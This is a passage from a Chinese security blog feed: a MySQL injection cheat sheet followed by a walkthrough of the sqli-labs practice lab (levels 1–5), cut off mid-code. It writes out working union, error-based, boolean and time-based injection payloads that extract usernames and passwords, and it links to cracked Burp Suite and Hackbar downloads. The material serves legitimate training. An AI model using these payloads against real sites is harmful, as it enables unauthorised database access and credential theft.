class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span><br><br><span class="hljs-comment"># 判断字段名（修改后面的 limit）</span><br><span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">&#x27;n1key&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>。<br><br><span class="hljs-comment"># 查询 ip 表。（边插入边查询，需要使用别名）</span><br><span class="hljs-keyword">SELECT</span> tid <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">select</span> ip tid <span class="hljs-keyword">from</span> n1ip <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">AS</span> tt<br><br><span class="hljs-comment"># 查询某个字段的数据（key 与数据库的关键词相冲突，需要使用别名）</span><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">GROUP_CONCAT</span>(<span class="hljs-keyword">id</span>) <span class="hljs-keyword">FROM</span> n1key<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(bb.key) <span class="hljs-keyword">from</span> n1key bb<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">key</span>) <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> n1key) <span class="hljs-keyword">as</span> a<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">id</span> <span class="hljs-keyword">from</span> n1key <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><span class="hljs-comment"># 不使用字段名度值</span><br><span class="hljs-keyword">SELECT</span> a<span class="hljs-number">.2</span> <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>, <span class="hljs-number">2</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> n1key<br><br><span class="hljs-comment"># 判断是否有数据</span><br><span class="hljs-keyword">SELECT</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">key</span> <span class="hljs-keyword">FROM</span> n1key) <span class="hljs-keyword">IS</span> <span class="hljs-literal">NULL</span><br><br><span class="hljs-comment"># 查询文件</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">LOAD_FILE</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>)<br><br></code></pre></td></tr></table></figure><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>参考文档：</p><ol><li><a href="https://3wapp.github.io/WebSecurity/mysqlinject.html">Mysql 注入-wiki</a></li><li><a href="https://blog.csdn.net/qq_43085611/article/details/112661431">sqli-labs(全通关刷题笔记)-slug01sh</a></li><li><a href="https://www.onebug.org/websafe/75808.html">Onebug.org | 安全防线</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs(全通关刷题笔记)</title>
    <link href="/2021/01/11/2021%E5%B9%B41%E6%9C%8811%E6%97%A5-sqli-labs-%E5%85%A8%E9%80%9A%E5%85%B3%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    <url>/2021/01/11/2021%E5%B9%B41%E6%9C%8811%E6%97%A5-sqli-labs-%E5%85%A8%E9%80%9A%E5%85%B3%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1 准备工作"></a>1 准备工作</h1><p>国光师傅太强了，准备写 sqli-labs 的博客，发现国光师傅已经写过了。不过俺的思路还是有一些不同之处。</p><ul><li>Sqli-labs 下载地址：<a href="https://github.com/skyblueee/sqli-labs-php7%E3%80%82">https://github.com/skyblueee/sqli-labs-php7。</a><blockquote><p>通常下载 Sqli-labs 时，会下载到最初的那个 sqli-labs，但是并不适用于PHP7。</p></blockquote></li><li>Burp Suite 下载地址：<a href="https://github.com/TrojanAZhen/BurpSuitePro-2.1">https://github.com/TrojanAZhen/BurpSuitePro-2.1</a></li><li>Hackbar 下载地址：<a href="https://github.com/ox01024/hackbar_crack">https://github.com/ox01024/hackbar_crack</a></li><li>Navicat：可以用来写 SQL 语句，有自动补全功能。</li></ul><p>我使用VScode来运行 sql-labs，国光师傅使用的是 Docker 安装。对于我这种菜鸡，还是先采用复杂的方法吧。</p><h1 id="2-基础挑战-1-20"><a href="#2-基础挑战-1-20" class="headerlink" title="2 基础挑战(1-20)"></a>2 基础挑战(1-20)</h1><h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p><p>闭合方式是非常关键的一步，能正确的闭合 SQL 语句，SQL 注入工作结束一半。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>?<span class="hljs-attribute">id</span>=1       # 可以看到登陆的用户名和密码<br>?<span class="hljs-attribute">id</span>=1&#x27;      # SQL报错（1<span class="hljs-string">&#x27;&#x27;</span> LIMIT 0,1），并且可以看到部分 SQL 语句（说明存在 SQL 注入）。报错显示 SQL 语句中使用两个单引号导致错误（传参引入的单引号+原来的 SQL 语句中原有的单引号），可以在传参引入的单引号后添加注释符来注释后面那个单引号）。<br>?<span class="hljs-attribute">id</span>=1&#x27;#     # 报错。原因：在URL中GET可能作为锚点,无法传到后端。所以该用--+，--+的传入后端url解码后是-- （注意空格），当然也可以采用%23（手动url编码）<br>?<span class="hljs-attribute">id</span>=1&#x27;%23   # 正常回显<br>?<span class="hljs-attribute">id</span>=1&#x27;--+   # 正常回显（SELECT * <span class="hljs-keyword">FROM</span><span class="hljs-built_in"> users </span>WHERE <span class="hljs-attribute">id</span>=<span class="hljs-string">&#x27;1&#x27;</span> --+<span class="hljs-string">&#x27; LIMIT 0,1）</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>如果需要分析 SQL 注入的 SQL 变化，可以考虑修改源码来观察 SQL 语句。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/77218F39-FAF6-4918-A148-1FA5C031B27B.png"><br>这里有个值得思考的测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><br>?id=1%23 # SQL语句：SELECT * FROM users WHERE id=&#x27;1#&#x27; LIMIT 0,1<br><br></code></pre></td></tr></table></figure><p>按照正常思路，应该什么也查不到才对，结果却能正常查询id=1。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210114162823.png"><br>我们可以考虑在 Navicat 中进行测试，确定这种查询真实存在。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/E4F6DD5A-3000-4D14-BFC8-20E3F2ACEE6E.png"></p><p>上面这两种查询的结果都是一样的，非常奇怪吧？</p><p>和PHP的弱类型一样，MySQL也有弱类型，在闭合 SQL 语句时是会经常用到的。具体可以参考下面这片文章：<a href="https://blog.csdn.net/HaHa_Sir/article/details/93666147">MySQL 字符串类型用数字可以查出来 MySQL字符串类型会转换成数字 MySQL隐式类型转换</a>。</p><p>开始搜集数据库中的数据，常见的信息搜集有：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br><span class="hljs-function"><span class="hljs-title">system_user</span><span class="hljs-params">()</span></span>     系统用户名<br><span class="hljs-function"><span class="hljs-title">user</span><span class="hljs-params">()</span></span>            MYSQL用户名 <br><span class="hljs-function"><span class="hljs-title">current_user</span><span class="hljs-params">()</span></span>    当前用户名<br><span class="hljs-function"><span class="hljs-title">session_user</span><span class="hljs-params">()</span></span>    连接数据库的用户名<br><span class="hljs-function"><span class="hljs-title">database</span><span class="hljs-params">()</span></span>        当前数据库名<br><span class="hljs-function"><span class="hljs-title">schema</span><span class="hljs-params">()</span></span>          当前数据库名<br><span class="hljs-function"><span class="hljs-title">version</span><span class="hljs-params">()</span></span>         当前数据库版本信息<br>@@version<br><span class="hljs-function"><span class="hljs-title">load_file</span><span class="hljs-params">()</span></span>       MYSQL读取本地文件<br><br>@@datadir         Location of DB files<br>@@hostname        服务器主机名<br>@@basedir         MYSQL 安装路径<br>@@version_compile_os    操作系统<br><br></code></pre></td></tr></table></figure><p>简单的测试一下常见的信息</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment"># 查询数据库名</span><br>?<span class="hljs-attribute">id</span>=0&#x27; union select 1, database(), 3%23<br><br><span class="hljs-comment"># 查询数据库版本</span><br>?<span class="hljs-attribute">id</span>=0&#x27; union select 1, version(), 3%23<br><br><span class="hljs-comment"># 查询数据库用户</span><br>?<span class="hljs-attribute">id</span>=0&#x27; union select 1, user(), 3%23<br><br><span class="hljs-comment">#数据库路径</span><br>?<span class="hljs-attribute">id</span>=0&#x27; union select 1, @@datadir, 3%23<br><br><span class="hljs-comment"># 操作系统版本</span><br>?<span class="hljs-attribute">id</span>=0&#x27; union select 1, @@version_compile_os, 3%23<br><br><span class="hljs-comment"># 查询所有的数据库名</span><br><span class="hljs-comment"># SELECT GROUP_CONCAT(schema_name) FROM information_schema.SCHEMATA</span><br><span class="hljs-attribute">id</span>=0&#x27; union select 1, 2, group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata%23<br><br><span class="hljs-comment"># 查询某个数据库的数据表名</span><br><span class="hljs-comment"># SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()</span><br>?<span class="hljs-attribute">id</span>=0&#x27; union select 1, 2, group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database() --+<br>?<span class="hljs-attribute">id</span>=0&#x27; union select 1, 2, group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span> --+<br>?<span class="hljs-attribute">id</span>=0&#x27; union select 1, 2, group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=0x7365637572697479 --+ # hex编码<br><br><span class="hljs-comment"># 查询某个数据库的某个表的字段名</span><br><span class="hljs-comment"># SELECT GROUP_CONCAT(column_name) FROM information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;</span><br>?<span class="hljs-attribute">id</span>=0&#x27; union SELECT 1, 2, GROUP_CONCAT(column_name) <span class="hljs-keyword">FROM</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> --+<br><br><span class="hljs-comment"># 查询数据表的数据</span><br>?<span class="hljs-attribute">id</span>=0&#x27; union select 1, 2, group_concat(id, username, password) <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>--+<br><br></code></pre></td></tr></table></figure><p>需要更进一步的学习手工注入，可以参考这片文章:<a href="https://www.freebuf.com/articles/web/160352.html">新手科普 | MySQL手工注入之基本注入流程</a></p><hr><h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p>闭合方式：<code>id=$id</code></p><p>和上一题主要是闭合方式不同。</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><br>?id=<span class="hljs-number">1</span>       <span class="hljs-comment"># 正常显示</span><br>?id=<span class="hljs-number">1</span> --+   <span class="hljs-comment"># 正常显示</span><br>?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27;      # 正常显示</span><br><span class="hljs-string">?id=1&#x27;</span> --+  <span class="hljs-comment"># 错误（并没有看到引号，故该题的闭合方式是数字型）</span><br>?id=<span class="hljs-number">0</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,2, 3 --+       <span class="hljs-comment"># 回显2，3。说明显示第2个字段和第3个字段。</span></span><br><br></code></pre></td></tr></table></figure><p>和 less-1 的区别：闭合方式。less-1 是字符类型，有单引号包裹。less-2 是 int 类型，不需要单引号。其他注入获取信息的姿势是一样的。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=<span class="hljs-string">&#x27;$id&#x27;</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=$<span class="hljs-keyword">id</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>?<span class="hljs-attribute">id</span>=1&#x27;<br><span class="hljs-comment"># 报错信息：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27;) LIMIT 0,1&#x27; at line 1</span><br><span class="hljs-comment"># 在SQL语句中有小括号（可以在本地先进行测试）。考虑将括号进行闭合</span><br><br>?<span class="hljs-attribute">id</span>=1&#x27;) --+<br><span class="hljs-comment"># 正常显示</span><br><br>?<span class="hljs-attribute">id</span>=1&#x27;) <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1 --+<br><span class="hljs-comment"># 正常显示</span><br><br>?<span class="hljs-attribute">id</span>=1&#x27;) <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=0 --+<br><span class="hljs-comment"># 没有数据</span><br><br>?<span class="hljs-attribute">id</span>=0&#x27;) <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1 union select 1,2, 3 --+<br><span class="hljs-comment"># Your Login name:2，Your Password:3。说明显示第2个字段和第3个字段。</span><br><br></code></pre></td></tr></table></figure><p>简单分析：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment"># 本题：</span><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=(<span class="hljs-string">&#x27;$id&#x27;</span>) <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><span class="hljs-comment"># 前两题：</span><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=<span class="hljs-string">&#x27;$id&#x27;</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=$<span class="hljs-keyword">id</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><span class="hljs-comment"># 前三个都只是闭合的方式不同</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>闭合方式：<code>id=(&quot;$id&quot;)</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>?<span class="hljs-attribute">id</span>=1&quot;<br><span class="hljs-comment"># s You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot;1&quot;&quot;) LIMIT 0,1&#x27; at line 1</span><br><span class="hljs-comment"># 依然有括号，尝试闭合括号</span><br><br>?<span class="hljs-attribute">id</span>=1&quot;) --+<br><span class="hljs-comment"># 正常输出</span><br><br>?<span class="hljs-attribute">id</span>=1&quot;) <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1 --+<br><span class="hljs-comment"># 正常输出</span><br><br>?<span class="hljs-attribute">id</span>=1&quot;) <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=0 --+<br><span class="hljs-comment"># 不显示</span><br><br>?<span class="hljs-attribute">id</span>=0&quot;) <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=0 union select 1, 2, 3 --+<br><span class="hljs-comment"># Your Login name:2，Your Password:3。说明显示第2个字段和第3个字段。</span><br><br></code></pre></td></tr></table></figure><p>简单分析：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment"># 本题：</span><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=(<span class="hljs-string">&quot;$id&quot;</span>) <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><span class="hljs-comment"># 前三题：</span><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=<span class="hljs-string">&#x27;$id&#x27;</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=$<span class="hljs-keyword">id</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=(<span class="hljs-string">&#x27;$id&#x27;</span>) <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><br><span class="hljs-comment"># 闭合方式不同</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p><p>前面 4 个 lession 都是最基本的注入姿势，并且是能够查询得到返回结果的。按照<code>回显方式</code>来分类的话，我认为可以分为 5 类：</p><ul><li>联合注入</li><li>报错注入</li><li>布尔注入</li><li>延时注入</li><li>其他（DNSlog）</li></ul><p>注意：这里仅按照回显方式分类。很难做到完全 MECE 原则（Mutually Exclusive, Collectively Exhaustive / 相互独立、完全穷尽），通常按照下面的优先原则进行：</p><blockquote><p>联合注入&gt;报错注入&gt;布尔注入&gt;延时注入&gt;其他（DNSlog）</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>?<span class="hljs-attribute">id</span>=1<br><span class="hljs-comment"># s You are in...........</span><br><span class="hljs-comment"># 没有用户信息。只能考虑报错注入、布尔注入、时间盲注。</span><br><br>?<span class="hljs-attribute">id</span>=1&quot;<br><span class="hljs-comment"># s You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &quot;1&quot; LIMIT 0,1&#x27; at line 1</span><br><span class="hljs-comment"># 闭合单引号</span><br><br>?<span class="hljs-attribute">id</span>=1&#x27; --+<br><span class="hljs-comment"># 正常输出</span><br><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1 --+<br><span class="hljs-comment"># 正常输出</span><br><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=0 --+<br><span class="hljs-comment"># 不显示</span><br><br>?<span class="hljs-attribute">id</span>=0&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=0 union select 1, 2, 3 --+<br><span class="hljs-comment">#  You are in...........，无法得到数据</span><br><br></code></pre></td></tr></table></figure><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>根据上面的优先级，我们考虑先报错注入开始测试</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">id</span>=<span class="hljs-number">0</span>&#x27; and <span class="hljs-number">1</span>=<span class="hljs-number">0</span> union select updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select @@version),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>); --+<br><span class="hljs-comment"># s XPATH syntax error: &#x27;~8.0.19~&#x27;</span><br><span class="hljs-comment"># 将 select @@version 进行修改即可查询其他的数据。</span><br><br></code></pre></td></tr></table></figure><p>原理：MySQL在执行SQL语句时，某些函数会将子查询的结果显示在报错信息中。更多的报错注入参考：<a href="https://xz.aliyun.com/t/253?spm=5176.12901015.0.i12901015.322c525cGjiCkg&accounttraceid=0e789a5d27b94462a64cd6d053faaab4tmnn#toc-1">先知社区-MYSQL报错注入的一点总结</a></p><hr><h3 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h3><p>尝试使用<strong>布尔注入</strong>进行测试，布尔注入会稍微比较复杂，不过基本原理不算复杂。</p><blockquote><p>基本原理：用true与false去一点点确定信息，汇总之后就能得到整个数据库的信息。如：</p><ul><li>问：数据库名长度大于8？</li><li>答：false</li><li>问：数据库名长度小于8？</li><li>答：false（可以确定数据库的长度为8）</li><li>问：数据库第一个首字母是s？</li><li>答：是</li></ul></blockquote><p>简单验证是否能进行布尔注入</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1 --+<br><span class="hljs-comment"># 正常显示</span><br><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=0 --+<br><span class="hljs-comment"># 不显示</span><br><br></code></pre></td></tr></table></figure><p>利用页面内容的显示和不显示，来判断我们查询的内容是什么。将我们想要查询的内容进行拆分，然后逐个判断。例如：想要知道数据库名，我们可以先询问系统：“第一个字符是不是a？”，如果不是，就继续询问是否为b，直到问出结果。然后再去寻找第二个字符。</p><p>常用的函数：</p><ul><li>substr(string string,num start,num length);<br>string为字符串；start为起始位置；length为长度。（mysql中的start是从1开始的）</li><li>left()(str,length);str是要提取子字符串的字符串。length是一个正整数，指定将从左边返回的字符数。<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br>?id=<span class="hljs-number">1</span>&#x27; and substr(database(), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)=<span class="hljs-string">&quot;a&quot;</span>  --+<br># 不显示<br><br>?id=<span class="hljs-number">1</span>&#x27; and substr(database(), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)=<span class="hljs-string">&quot;s&quot;</span>  --+<br># 正常显示<br><br>?id=<span class="hljs-number">1</span>&#x27; and substr(database(), <span class="hljs-number">1</span>, <span class="hljs-number">8</span>)=<span class="hljs-string">&quot;security&quot;</span>  --+<br># 正常显示<br><br>?id=<span class="hljs-number">1</span>&#x27; and substr(database(), <span class="hljs-number">1</span>, <span class="hljs-number">8</span>)=<span class="hljs-number">0x7365637572697479</span>  --+<br># 正常显示<br><br></code></pre></td></tr></table></figure>我们将中间的database()，替换成其他的SQL语句就可以查询其他的结果了。</li></ul><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>时间盲注通常在看不到任何回显信息的时候尝试，时间盲注是在布尔注入的基础上的。布尔注入是利用网站自带的回显，而时间注入则是将 true 和 false 转化为不同的等待时间。直接修改上面的 Payload 可得：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br>?id=<span class="hljs-number">1</span>&#x27; and if(substr(database(), <span class="hljs-number">1</span>, <span class="hljs-number">8</span>)=<span class="hljs-number">0x7365637572697479</span>, sleep(<span class="hljs-number">5</span>), <span class="hljs-number">1</span>)  --+<br># 有明显的延时<br><br></code></pre></td></tr></table></figure><p>简单分析：<br>这个 lession 和前面的不同点在于回显方式。这个 lession 并不会像先前一样，显示并返回查询到的信息，而是告诉你是否正确。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>$sql=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<br>$result=mysqli_query($con1, $sql);<br>$row = 